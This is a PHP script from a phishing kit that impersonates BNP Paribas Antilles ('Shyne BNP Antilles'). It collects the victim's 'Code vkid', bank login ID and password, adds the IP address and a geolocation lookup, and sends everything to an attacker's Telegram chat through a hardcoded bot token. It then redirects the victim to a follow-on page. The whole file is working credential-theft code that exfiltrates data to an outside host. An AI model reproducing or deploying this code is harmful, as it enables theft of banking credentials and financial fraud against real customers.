<?php

include 'antibots.php';

/**var_dump($_POST['p1']);

var_dump($_POST['p0']);

var_dump($_POST); exit();**/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

$message = "";

$message .= "==========  Shyne BNP Antilles ==========\n";
$message .= "Code vkid : ".$_POST['vkid']."\n";
$message .= "Identifiant : ".$_POST['p0']."\n";
$message .= "Mot de passe : ".$_POST['p1']."\n"; 
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne BNP Antilles  =========\n";

include './extra/extra.php';
/**$message = "";

while ([$key = key($_POST), $val = current($_POST)])
    
     {
           if(!empty($val)) {
                $message .= "$key : $val\n";
                
            }
            
        }**/

$telegram = new Telegram('7341930814:AAEWyt4OxEBNCyOlqogU356O5O90rjcnRtc');
$chat_id = 1678960473 ;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

 
 header('location: mobile.php');
 
 ?>